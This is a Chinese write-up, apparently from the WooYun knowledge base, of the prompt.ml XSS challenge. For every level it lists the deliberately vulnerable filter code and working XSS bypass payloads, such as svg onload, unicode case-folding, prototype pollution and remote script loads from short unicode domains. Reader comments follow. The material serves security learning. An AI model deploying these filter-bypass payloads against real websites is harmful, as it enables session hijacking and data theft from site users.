@@ -1,0 +1,354 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">xss挑战赛writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">西门吹雪</a> <span class="bull">·</span> <time title="2014/09/22 12:30" ui-time="" datetime="2014/09/22 12:30" class="published ng-binding ng-isolate-scope">2014/09/22 12:30</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>挑战地址：<a href="http://prompt.ml/0">http://prompt.ml/0</a></p><p>from:<a href="https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml">https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml</a></p><h2>规则：</h2><ol><li>成功执行 <code>prompt(1)</code></li><li>payload不需要用户交互</li><li>payload必须对下述浏览器有效：</li></ol><ul><li>Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式) 4. 每个级别至少给出两种浏览器的答案 5. 字符越少越好</li></ul><h2>Level 0</h2><hr><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // warm up
+    // script should be executed without user interaction
+    return '&lt;input type="text" value="' + input + '"&gt;';
+}
+</code></pre><h3>答案</h3><pre><code>#!html
+"&gt;&lt;svg/onload=prompt(1)&gt;
+</code></pre><p>这个payload 24个字符。还有一个比较不常用的技巧，在IE10下，当页面第一次加载时，会调用<code>resize</code>事件，这个payload只有20个字符</p><pre><code>#!js
+"onresize=prompt(1)&gt;
+</code></pre><h3>背景知识</h3><p><code>resize</code>事件在IE10及以下版本有效，IE11没有用。并且不需要用户交互。 更多信息：<a href="http://msdn.microsoft.com/en-us/library/ie/ms536959%28v=vs.85%29.aspx">http://msdn.microsoft.com/en-us/library/ie/ms536959%28v=vs.85%29.aspx</a></p><h2>Level 1</h2><hr><p>该级别实际是简单的过滤了<code>&gt;</code>，需要绕过以下即可。</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // tags stripping mechanism from ExtJS library
+    // Ext.util.Format.stripTags
+    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;
+    input = input.replace(stripTagsRE, '');
+
+    return '&lt;article&gt;' + input + '&lt;/article&gt;';
+}
+</code></pre><h3>答案</h3><pre><code>#!html
+&lt;svg/onload=prompt(1) 
+</code></pre><p>注:译者使用js改版<a href="http://sectest.sinaapp.com/xss/level1.php#%3Csvg/onload=prompt%281%29//">http://sectest.sinaapp.com/xss/level1.php</a>,测试答案为</p><pre><code>#!html
+&lt;svg/onload=prompt(1)//
+</code></pre><h2>Level 2</h2><hr><p>该级别过滤了<code>=</code>、<code>(</code>两种符号。</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    //                      v-- frowny face
+    input = input.replace(/[=(]/g, '');
+
+    // ok seriously, disallows equal signs and open parenthesis
+    return input;
+}
+</code></pre><h3>答案</h3><p>Firefox 和IE下的答案(29个字符)</p><pre><code>#!html
+&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;b&gt;
+</code></pre><p>Chrome下需要script闭合标签，所以上述payload不成功。最短的答案如下(35个字符)</p><pre><code>#!html
+&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;
+</code></pre><p>未来所有的浏览器支持ES6，还可以使用下述编码：</p><pre><code>#!html
+&lt;script&gt;eval.call`${'prompt\x281)'}`&lt;/script&gt;
+</code></pre><p>或者</p><pre><code>#!html
+&lt;script&gt;eval.call`${'prompt\x281)'}`&lt;/script&gt;
+</code></pre><h3>背景知识</h3><p>由于xml编码特性。在SVG向量里面的<code>&lt;script&gt;</code>元素（或者其他CDATA元素 ），会先进行xml解析。因此<code>&amp;#x28</code>（十六进制）或者<code>&amp;#40</code>（十进制）或者<code>&amp;lpar；</code>（html实体编码）会被还原成<code>（</code>。</p><h2>Level 3</h2><hr><p>过滤了<code>-&gt;</code>。但是2012已经公布，html5的注释标签不仅可以使用<code>--&gt;</code>，还可以使用<code>--!&gt;</code>。</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // filter potential comment end delimiters
+    input = input.replace(/-&gt;/g, '_');
+
+    // comment the input to avoid script execution
+    return '&lt;!-- ' + input + ' --&gt;';
+}
+</code></pre><p>25个字符通杀三个浏览器如下：</p><pre><code>#!html
+--!&gt;&lt;svg/onload=prompt(1)
+</code></pre><h2>Level 4</h2><hr><p>这个题目是利用url的特性绕过，浏览器支持这样的url：http://user:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e191809292968e9385a180959580828a8493cf828e8c026163055c6707794e">[email&#160;protected]</a><code>http://user:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1a6a7b69696d75687e355a7b6e6e7b79717f6834797577">[email&#160;protected]</a></code>是不允许的。由于这里的正则特性和<code>decodeURIComponent</code>函数，所以可以使用<code>%2f</code>绕过，如下：<code>http:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e6c9c99694898b9692c88b8ac3d480a687929287858d8394c885898b">[email&#160;protected]</a></code>。所以域名越短，答案就越短。</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // make sure the script belongs to own site
+    // sample script: http://prompt.ml/js/test.js
+    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
+        var script = document.createElement('script');
+        script.src = input;
+        return script.outerHTML;
+    } else {
+        return 'Invalid resource.';
+    }
+}
+</code></pre><h3>答案</h3><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2e01015e5c41435e5a0043420b1c486ecfaabc00595d">[email&#160;protected]</a>/✌
+</code></pre><h2>Level 5</h2><hr><p>过滤了<code>&gt;</code>，过滤了<code>onXXX=</code>，过滤了<code>focus</code>，所以不能使用<code>autofocus</code>。但是可以使用js的换行<code>\n</code>绕过<code>onXXX=</code>，IE下依然可以使用<code>onresize</code></p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // apply strict filter rules of level 0
+    // filter "&gt;" and event handlers
+    input = input.replace(/&gt;|on.+?=|focus/gi, '_');
+
+    return '&lt;input value="' + input + '" type="text"&gt;';
+}
+</code></pre><p>答案： 一种答案是，可以提交设置<code>type</code>为<code>image</code>，后面的<code>type</code>不能覆盖前面的设置。</p><pre><code>#!js
+"type=image src onerror
+="prompt(1)
+</code></pre><p>IE下可以使用更短的答案：</p><pre><code>#!js
+"onresize
+="prompt(1)
+</code></pre><h2>Level 6</h2><hr><p>虽然有过滤，但是可以将输入插入到form表单的<code>action</code>中。</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // let's do a post redirection
+    try {
+        // pass in formURL#formDataJSON
+        // e.g. http://httpbin.org/post#{"name":"Matt"}
+        var segments = input.split('#');
+        var formURL = segments[0];
+        var formData = JSON.parse(segments[1]);
+
+        var form = document.createElement('form');
+        form.action = formURL;
+        form.method = 'post';
+
+        for (var i in formData) {
+            var input = form.appendChild(document.createElement('input'));
+            input.name = i;
+            input.setAttribute('value', formData[i]);
+        }
+
+        return form.outerHTML + '                         \n\
+&lt;script&gt;                                                  \n\
+    // forbid javascript: or vbscript: and data: stuff    \n\
+    if (!/script:|data:/i.test(document.forms[0].action)) \n\
+        document.forms[0].submit();                       \n\
+    else                                                  \n\
+        document.write("Action forbidden.")               \n\
+&lt;/script&gt;                                                 \n\
+        ';
+    } catch (e) {
+        return 'Invalid form data.';
+    }
+}
+</code></pre><h3>答案</h3><p>33个字符</p><pre><code>#!js
+javascript:prompt(1)#{"action":1}
+</code></pre><p>IE下可以使用vbscript减少字符</p><pre><code>#!js
+vbscript:prompt(1)#{"action":1}
+</code></pre><h2>Level 7</h2><hr><p>可以使用js注释绕过。如下：</p><pre><code>#!html
+&lt;p class="comment" title=""&gt;&lt;svg/a="&gt;&lt;/p&gt;
+&lt;p class="comment" title=""onload='/*"&gt;&lt;/p&gt;
+&lt;p class="comment" title="*/prompt(1)'"&gt;&lt;/p&gt;
+</code></pre><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+    return segments.map(function(title) {
+        // title can only contain 12 characters
+        return '&lt;p class="comment" title="' + title.slice(0, 12) + '"&gt;&lt;/p&gt;';
+    }).join('\n');
+}
+</code></pre><h3>答案</h3><p>34个字符：</p><pre><code>#!html
+"&gt;&lt;svg/a=#"onload='/*#*/prompt(1)'
+</code></pre><p>IE下31个字符</p><pre><code>#!html
+"&gt;&lt;script x=#"async=#"src="//⒛₨
+
+
+&lt;p class="comment" title=""&gt;&lt;script x="&gt;&lt;/p&gt;
+&lt;p class="comment" title=""async="&gt;&lt;/p&gt;
+&lt;p class="comment" title=""src="//⒛₨"&gt;&lt;/p&gt;
+</code></pre><h3>背景知识</h3><p>小技巧：IE下可以使用##async##来加载不需要闭合的script文件。如下：</p><pre><code>#!html
+&lt;script src="test.js" async&gt;
+</code></pre><h2>Level 8</h2><hr><p>这题使用的两个技巧</p><ul><li><p><code>&lt;LS&gt;</code>是U+2028，是Unicode中的行分隔符。</p></li><li><p><code>&lt;PS&gt;</code>是U+2029，是Unicode中的段落分隔符。</p></li></ul><p>另外<code>--&gt;</code>，也可以在js中当注释使用，资料：<a href="https://javascript.spec.whatwg.org/#comment-syntax">https://javascript.spec.whatwg.org/#comment-syntax</a>，因此我们构造答案如下：</p><pre><code>#!html
+&lt;script&gt;
+// console.log("
+prompt(1)
+--&gt;");
+&lt;/script&gt;
+</code></pre><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // prevent input from getting out of comment
+    // strip off line-breaks and stuff
+    input = input.replace(/[\r\n&lt;/"]/g, '');
+
+    return '                                \n\
+&lt;script&gt;                                    \n\
+    // console.log("' + input + '");        \n\
+&lt;/script&gt; ';
+}
+</code></pre><h3>答案</h3><p>Chrome和Firefox下 14个字符</p><pre><code>#!js
+[U+2028]prompt(1)[U+2028]--&gt;
+</code></pre><h3>背景知识</h3><p>比较奇怪的是，js中的换行符跟unicode中的不一致。另外，HTML代码的注释可以在Javascript中使用</p><h2>Level 9</h2><hr><p>该题使用正则<code>&lt;([a-zA-Z])</code>，导致无法注入HTML标签。但是toUpperCase()函数是支持Unicode函数。字符<code>ſ</code>经过函数toUpperCase()处理后，会变成ASCII码字符"S"。</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // filter potential start-tags
+    input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1');
+    // use all-caps for heading
+    input = input.toUpperCase();
+
+    // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!
+    return '&lt;h1&gt;' + input + '&lt;/h1&gt;';
+}
+</code></pre><h3>答案</h3><p>26个字符通杀浏览器的答案</p><pre><code>#!html
+&lt;ſcript/ſrc=//⒕₨&gt;&lt;/ſcript&gt;
+</code></pre><p>或者使用async</p><pre><code>#!html
+&lt;ſcript/async/src=//⒛₨&gt;
+</code></pre><h2>Level 10</h2><hr><p>这个题目使用两个正则过滤。比较容易</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // (╯°□°）╯︵ ┻━┻
+    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
+    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
+    input = input.replace(/'/g, '');
+
+    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
+    return '&lt;script&gt;' + input + '&lt;/script&gt; ';
+}
+</code></pre><h3>答案</h3><pre><code>#!js
+p'rompt(1)
+</code></pre><h2>Level 11</h2><hr><p>这个题目直接允许注入数据到script标签里面，但是过滤了特殊符号。这里的技巧是使用一个数据或者字母拥有操作符的功能，就是in</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // name should not contain special characters
+    var memberName = input.replace(/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g, '');
+
+    // data to be parsed as JSON
+    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
+
+    // directly "parse" data in script context
+    return '                                \n\
+&lt;script&gt;                                    \n\
+    var data = ' + dataString + ';          \n\
+    if (data.action === "login")            \n\
+        document.write(data.message)        \n\
+&lt;/script&gt; ';
+}
+</code></pre><h3>答案</h3><pre><code>#!js
+"(prompt(1))in"
+
+
+&lt;script&gt;                                    
+    var data = {"action":"login","message":"Welcome back, "(prompt(1))in"."};          
+    if (data.action === "login")            
+        document.write(data.message)        
+&lt;/script&gt;
+</code></pre><h3>背景知识</h3><p><code>"test"(alert(1))</code>虽然会提示语法错误， 但是还是会执行js语句。类似的<code>alert(1)in"test"</code>也是一样。可以在控制台下使用F12执行</p><h2>Level 12</h2><hr><p>该题主要是利用toString()解答。eval可以直接执行字符串。如下：</p><pre><code>#!js
+parseInt("prompt",36); //1558153217
+</code></pre><p>因此，</p><ul><li><p>可以使用<code>eval((1558153217).toString(36))(1)</code></p></li><li><p>还可以<code>eval(1558153217..toString(36))(1)</code></p></li><li><p>还可以<code>eval(630038579..toString(30))(1)</code></p></li></ul><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // in Soviet Russia...
+    input = encodeURIComponent(input).replace(/'/g, '');
+    // table flips you!
+    input = input.replace(/prompt/g, 'alert');
+
+    // ノ┬─┬ノ ︵ ( \o°o)\
+    return '&lt;script&gt;' + input + '&lt;/script&gt; ';
+}
+</code></pre><h3>答案</h3><p>32个字符通杀所有浏览器</p><pre><code>#!js
+eval(630038579..toString(30))(1)
+
+// Hexadecimal alternative (630038579 == 0x258da033):
+eval(0x258da033.toString(30))(1)
+</code></pre><p>还有一种比较暴力的方法是，通过循环执行self里面的函数，来查找prompt执行(firfox下测试有效)</p><pre><code>#!js
+for((i)in(self))eval(i)(1)
+</code></pre><h2>Level 13</h2><hr><p>这个题目涉及到js中的<code>__proto__</code>，每个对象都会在其内部初始化一个属性，就是<code>__proto__</code>，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去<code>__proto__</code>里面找这个属性，这个<code>__proto__</code>又会有自己的<code>__proto__</code>，一直这样找下去。可以再Chrome控制台中测试：</p><pre><code>#!js
+config = {
+    "source": "_-_invalid-URL_-_",
+    "__proto__": {
+        "source": "my_evil_payload"
+    }
+}
+</code></pre><p>输入</p><pre><code>#!js
+delete config.source
+config.source
+</code></pre><p>返回</p><pre><code>my_evil_payload
+</code></pre><p>还有一个技巧是，replace()这个函数，他还接受一些特殊的匹配模式<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Description">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Description</a> 翻译如下：</p><pre><code>$` 替换查找的字符串，并且在头部加上比配位置前的字符串部分
+</code></pre><p>举个例子就是：</p><pre><code>'123456'.replace('34','$`xss')
+</code></pre><p>返回</p><pre><code>'1212xss56'
+</code></pre><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // extend method from Underscore library
+    // _.extend(destination, *sources)
+    function extend(obj) {
+        var source, prop;
+        for (var i = 1, length = arguments.length; i &lt; length; i++) {
+            source = arguments[i];
+            for (prop in source) {
+                obj[prop] = source[prop];
+            }
+        }
+        return obj;
+    }
+    // a simple picture plugin
+    try {
+        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
+        var data = JSON.parse(input);
+        var config = extend({
+            // default image source
+            source: 'http://placehold.it/350x150'
+        }, JSON.parse(input));
+        // forbit invalid image source
+        if (/[^\w:\/.]/.test(config.source)) {
+            delete config.source;
+        }
+        // purify the source by stripping off "
+        var source = config.source.replace(/"/g, '');
+        // insert the content using mustache-ish template
+        return '&lt;img src="{{source}}"&gt;'.replace('{{source}}', source);
+    } catch (e) {
+        return 'Invalid image data.';
+    }
+}
+</code></pre><h3>答案</h3><p>59个字符，通杀所有浏览器</p><pre><code>#!js
+{"source":{},"__proto__":{"source":"$`onerror=prompt(1)&gt;"}}
+</code></pre><h2>Level 14</h2><hr><p>这个题目使用base64绕过。</p><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // I expect this one will have other solutions, so be creative :)
+    // mspaint makes all file names in all-caps :(
+    // too lazy to convert them back in lower case
+    // sample input: prompt.jpg =&gt; PROMPT.JPG
+    input = input.toUpperCase();
+    // only allows images loaded from own host or data URI scheme
+    input = input.replace(/\/\/|\w+:/g, 'data:');
+    // miscellaneous filtering
+    input = input.replace(/[\\&amp;+%\s]|vbs/gi, '_');
+    return '&lt;img src="' + input + '"&gt;';
+}
+</code></pre><h3>答案</h3><p>firfox下94个字符</p><pre><code>#!html
+"&gt;&lt;IFRAME/SRC="x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=
+</code></pre><p>IE下</p><pre><code>#!html
+"&gt;&lt;script/async/src="/〳⒛₨
+
+
+&lt;img src=""&gt;&lt;SCRIPT/ASYNC/SRC="/〳⒛₨"&gt;
+</code></pre><h3>背景知识</h3><p>这里再次使用了Unicode字符绕过。</p><h2>Level 15</h2><hr><p>过滤了<em>,所以不能使用js注释/</em>，但是前面也提到了，html里面的<code>&lt;!--</code>,<code>--&gt;</code>同样可以在js中使用，如下</p><pre><code>#!html
+&lt;p class="comment" title=""&gt;&lt;svg&gt;&lt;!--" data-comment='{"id":0}'&gt;&lt;/p&gt;
+&lt;p class="comment" title="--&gt;&lt;script&gt;&lt;!--" data-comment='{"id":1}'&gt;&lt;/p&gt;
+&lt;p class="comment" title="--&gt;prompt(1&lt;!--" data-comment='{"id":2}'&gt;&lt;/p&gt;
+&lt;p class="comment" title="--&gt;)&lt;/script&gt;" data-comment='{"id":3}'&gt;&lt;/p&gt;
+</code></pre><h3>代码</h3><pre><code>#!js
+function escape(input) {
+    // sort of spoiler of level 7
+    input = input.replace(/\*/g, '');
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+
+    return segments.map(function(title, index) {
+        // title can only contain 15 characters
+        return '&lt;p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'&gt;&lt;/p&gt;';
+    }).join('\n');
+}
+</code></pre><h3>答案</h3><p>57个字符</p><pre><code>#!html
+"&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;
+</code></pre><p>在Firefox和IE下，<code>&lt;/script&gt;</code>不需要，可以减少到42个字符</p><pre><code>#!html
+"&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1)&lt;/
+</code></pre><p>在最新的Firefox Aurora版本上，还可以如下（译者未测试）：</p><pre><code>#!html
+"&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;
+</code></pre><h2>Hidden Level</h2><p>这里主要使用了两个非常有用的技巧，第一个是javascript的变量提升，以下语法可以在chrome下F12执行</p><pre><code>#!js
+function functionDeclaration(a,b,c) {
+    alert('Function declared with ' + functionDeclaration.length + ' parameters');
+}
+
+
+functionDeclaration(); //alert &gt; Function declared with 3 parameters
+</code></pre><p>还有一个技巧就是第13题提到的<code>replace()</code>的匹配技巧，使用<code>$&amp;</code>，测试如下：</p><pre><code>'123456'.replace('34','$&amp;x')
+
+'1234x56'   //x 直接插入到 查找到的 34位置
+</code></pre><p>所以可以构造下面的代码</p><pre><code>#!js
+if (history.length &gt; 1337) {                                 
+   // you can inject any code here
+   // as long as it will be executed
+   function history(l,o,r,e,m...1338 times...){{injection}}
+   prompt(1)
+}   
+</code></pre><h3>code</h3><pre><code>#!js
+function escape(input) {
+    // WORLD -1
+    // strip off certain characters from breaking conditional statement
+    input = input.replace(/[}&lt;]/g, '');
+    return '                                                     \n\
+&lt;script&gt;                                                         \n\
+    if (history.length &gt; 1337) {                                 \n\
+        // you can inject any code here                          \n\
+        // as long as it will be executed                        \n\
+        {{injection}}                                            \n\
+    }                                                            \n\
+&lt;/script&gt;                                                        \n\
+    '.replace('{{injection}}', input);
+}
+</code></pre><h3>答案</h3><p>总共2704个字母</p><pre><code>#!js
+function history(L,o,r,e,m,I,p,s,u,m,i,s,s,i,m,p,l,y,d,u,m,m,y,t,e,x,t,o,f,t,h,e,p,r,i,n,t,i,n,g,a,n,d,t,y,p,e,s,e,t,t,i,n,g,i,n,d,u,s,t,r,y,L,o,r,e,m,I,p,s,u,m,h,a,s,b,e,e,n,t,h,e,i,n,d,u,s,t,r,y,s,s,t,a,n,d,a,r,d,d,u,m,m,y,t,e,x,t,e,v,e,r,s,i,n,c,e,t,h,e,s,w,h,e,n,a,n,u,n,k,n,o,w,n,p,r,i,n,t,e,r,t,o,o,k,a,g,a,l,l,e,y,o,f,t,y,p,e,a,n,d,s,c,r,a,m,b,l,e,d,i,t,t,o,m,a,k,e,a,t,y,p,e,s,p,e,c,i,m,e,n,b,o,o,k,I,t,h,a,s,s,u,r,v,i,v,e,d,n,o,t,o,n,l,y,f,i,v,e,c,e,n,t,u,r,i,e,s,b,u,t,a,l,s,o,t,h,e,l,e,a,p,i,n,t,o,e,l,e,c,t,r,o,n,i,c,t,y,p,e,s,e,t,t,i,n,g,r,e,m,a,i,n,i,n,g,e,s,s,e,n,t,i,a,l,l,y,u,n,c,h,a,n,g,e,d,I,t,w,a,s,p,o,p,u,l,a,r,i,s,e,d,i,n,t,h,e,s,w,i,t,h,t,h,e,r,e,l,e,a,s,e,o,f,L,e,t,r,a,s,e,t,s,h,e,e,t,s,c,o,n,t,a,i,n,i,n,g,L,o,r,e,m,I,p,s,u,m,p,a,s,s,a,g,e,s,a,n,d,m,o,r,e,r,e,c,e,n,t,l,y,w,i,t,h,d,e,s,k,t,o,p,p,u,b,l,i,s,h,i,n,g,s,o,f,t,w,a,r,e,l,i,k,e,A,l,d,u,s,P,a,g,e,M,a,k,e,r,i,n,c,l,u,d,i,n,g,v,e,r,s,i,o,n,s,o,f,L,o,r,e,m,I,p,s,u,m,I,t,i,s,a,l,o,n,g,e,s,t,a,b,l,i,s,h,e,d,f,a,c,t,t,h,a,t,a,r,e,a,d,e,r,w,i,l,l,b,e,d,i,s,t,r,a,c,t,e,d,b,y,t,h,e,r,e,a,d,a,b,l,e,c,o,n,t,e,n,t,o,f,a,p,a,g,e,w,h,e,n,l,o,o,k,i,n,g,a,t,i,t,s,l,a,y,o,u,t,T,h,e,p,o,i,n,t,o,f,u,s,i,n,g,L,o,r,e,m,I,p,s,u,m,i,s,t,h,a,t,i,t,h,a,s,a,m,o,r,e,o,r,l,e,s,s,n,o,r,m,a,l,d,i,s,t,r,i,b,u,t,i,o,n,o,f,l,e,t,t,e,r,s,a,s,o,p,p,o,s,e,d,t,o,u,s,i,n,g,C,o,n,t,e,n,t,h,e,r,e,c,o,n,t,e,n,t,h,e,r,e,m,a,k,i,n,g,i,t,l,o,o,k,l,i,k,e,r,e,a,d,a,b,l,e,E,n,g,l,i,s,h,M,a,n,y,d,e,s,k,t,o,p,p,u,b,l,i,s,h,i,n,g,p,a,c,k,a,g,e,s,a,n,d,w,e,b,p,a,g,e,e,d,i,t,o,r,s,n,o,w,u,s,e,L,o,r,e,m,I,p,s,u,m,a,s,t,h,e,i,r,d,e,f,a,u,l,t,m,o,d,e,l,t,e,x,t,a,n,d,a,s,e,a,r,c,h,f,o,r,l,o,r,e,m,i,p,s,u,m,w,i,l,l,u,n,c,o,v,e,r,m,a,n,y,w,e,b,s,i,t,e,s,s,t,i,l,l,i,n,t,h,e,i,r,i,n,f,a,n,c,y,V,a,r,i,o,u,s,v,e,r,s,i,o,n,s,h,a,v,e,e,v,o,l,v,e,d,o,v,e,r,t,h,e,y,e,a,r,s,s,o,m,e,t,i,m,e,s,b,y,a,c,c,i,d,e,n,t,s,o,m,e,t,i,m,e,s,o,n,p,u,r,p,o,s,e,i,n,j,e,c,t,e,d,h,u,m,o,u,r,a,n,d,t,h,e,l,i,k,e,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_)$&amp;prompt(1)
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">菜鸟</span> <span class="reply-time">2016-06-23 16:16:39</span></div><p></p><p>&lt;svg/onload=prompt(1)<br>怎么解释这个 不太明白</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小福仔</span> <span class="reply-time">2015-08-17 09:16:51</span></div><p></p><p>膜拜</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mark</span> <span class="reply-time">2015-07-12 14:59:00</span></div><p></p><p>膜拜</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ca1n</span> <span class="reply-time">2014-12-23 09:25:27</span></div><p></p><p>%2f是转码的/后面的是自己xss平台的url</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mr丶Mario</span> <span class="reply-time">2014-12-23 01:55:25</span></div><p></p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="05edaab2ec92abe1bd8ee685872a2a75776a6875712b686920376345e481972b7276">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3817daa4b4dbb8badaaaaddaba90d087a1dc82a3dd9dbfdeb892dfa2bcdd95afdf949edea097dc83b8dc81b0debcb7deb8a5ddadb2dbb8badeb8b6dc81b0ddb7a0de">[email&#160;protected]</a>的？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bug</span> <span class="reply-time">2014-11-24 22:29:34</span></div><p></p><p>代码粘贴上去有误，<br>if(at 65)应为：<br>if(at 小于 123 并且 at 大于 64)//英文字母的ASCII码范围</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bug</span> <span class="reply-time">2014-11-24 22:26:10</span></div><p></p><p>自己写一段JS脚本测试下便知。<br>function dump()<br>{<br>for (var i = 0; i &lt; 65535; i++)<br>{<br>var at = String.fromCharCode(i).toUpperCase().charCodeAt();<br>if (at 65)<br>{<br>console.log(String.fromCharCode(i) + '==' + String.fromCharCode(i).toUpperCase());<br>}<br>}<br>}</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">呆萌sky</span> <span class="reply-time">2014-09-29 18:15:12</span></div><p></p><p>请问一下，第9题那个字符ſ是什么类型的字符？经过toUpperCase()处理后变成了S。是不是每个英文字母和特殊符号都有这种对应的字符？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">depycode</span> <span class="reply-time">2014-09-24 22:49:30</span></div><p></p><p>膜拜大牛！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x_Jin</span> <span class="reply-time">2014-09-22 22:44:11</span></div><p></p><p>puzzle 后面几期没发 wooyun了 一直发 twitter 了 发 wooyun 都没人做~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">he1renyagao</span> <span class="reply-time">2014-09-22 17:11:06</span></div><p></p><p>这个作者有发wooyun、在那个帖子中有更新,给出了地址了。</p><p></p></div></div><div class="note-comment"><img class="avatar" 